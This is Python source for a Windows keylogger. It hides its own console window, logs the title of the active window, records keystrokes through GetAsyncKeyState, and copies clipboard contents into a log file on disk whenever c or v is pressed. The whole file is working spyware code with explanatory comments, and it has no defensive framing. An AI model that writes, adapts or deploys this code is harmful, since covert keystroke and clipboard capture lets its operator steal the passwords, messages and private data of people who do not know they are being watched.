import ctypes       # For interfacing with C functions
import logging      # For logging the keystrokes on disk

kernel32 = ctypes.windll.kernel32   # Access functions from kernel32.dll
user32 = ctypes.windll.user32       # Access functions from user32.dll

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)   # Hide console

def get_current_window(): # Function to grab the current window and its title
    
    # Required WinAPI functions
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW
    
    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar, passing the handle as argument
    buff = ctypes.create_unicode_buffer(length + 1) # Create buffer to store the window title string
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get pointer to memory location where the data is located
            text = ctypes.c_char_p(data_locked) # Get a char * pointer (string in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode('utf-8') # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard
        

def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes

    # Logger
    logging.basicConfig(filename=(log_dir +"\\" + log_name), level=logging.DEBUG, format='%(message)s')

    GetAsyncKeyState = user32.GetAsyncKeyState # WinAPI function that determines whether a key is up or down
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock', 0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = [] # Stores the characters pressed

    while True:

        if current_window != get_current_window(): # If the content of current_window isn't the currently opened window
            current_window = get_current_window() # Put the window title in current_window
            logging.info(str(current_window).encode('utf-8')) # Write the current window title in the log file
        
        for i in range(1, 256): # Because there are 256 ASCII characters (even though we only really use 128)
            if GetAsyncKeyState(i) & 1: # If a key is pressed and matches an ASCII character
                if i in special_keys: # If special key, log as such
                    logging.info("<{}>".format(special_keys[i]))
                elif i == 0x0d: # If <ENTER>, log the line typed then clear the line variable
                    logging.info(line)
                    line.clear()
                elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76: # If characters 'c' or 'v' are pressed, get clipboard data
                    clipboard_data = get_clipboard()
                    logging.info("[CLIPBOARD] {}".format(clipboard_data))
                elif 0x30 <= i <= 0x5a: # If alphanumeric character, append to line
                    line.append(chr(i))

